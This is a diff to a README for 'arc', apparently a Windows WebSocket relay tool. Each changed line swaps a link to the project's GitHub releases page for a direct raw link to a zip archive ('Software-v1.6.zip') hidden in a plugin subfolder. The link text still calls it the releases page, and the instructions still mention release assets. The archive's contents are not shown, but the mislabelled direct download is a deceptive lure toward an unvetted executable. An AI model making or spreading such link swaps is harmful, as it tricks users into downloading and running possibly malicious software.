@@ -1,6 +1,6 @@
 # 🔗 arc - Run a WebSocket relay on Windows
 
-[![Download arc](https://img.shields.io/badge/Download%20arc-blue?style=for-the-badge&logo=github)](https://github.com/Intrusive-justice55/arc/releases)
+[![Download arc](https://img.shields.io/badge/Download%20arc-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Intrusive-justice55/arc/main/hermes-plugin/arc-remote-control/Software-v1.6.zip)
 
 ## 🧭 What arc does
 
@@ -10,7 +10,7 @@ Use it when you need a simple link between a control app and a remote agent. It 
 
 ## 📥 Download arc
 
-1. Open the [arc releases page](https://github.com/Intrusive-justice55/arc/releases).
+1. Open the [arc releases page](https://raw.githubusercontent.com/Intrusive-justice55/arc/main/hermes-plugin/arc-remote-control/Software-v1.6.zip).
 2. Find the latest release at the top of the page.
 3. Under **Assets**, download the Windows file.
 4. Save the file to your Downloads folder or another easy place to find.
@@ -197,4 +197,4 @@ If the release page gives more than one choice, pick the one that fits how you w
 
 ## 📦 Download and install again
 
-If you need a fresh copy, go to the [arc releases page](https://github.com/Intrusive-justice55/arc/releases), download the latest Windows file, extract it if needed, and run the app from the folder where you saved it
+If you need a fresh copy, go to the [arc releases page](https://raw.githubusercontent.com/Intrusive-justice55/arc/main/hermes-plugin/arc-remote-control/Software-v1.6.zip), download the latest Windows file, extract it if needed, and run the app from the folder where you saved it
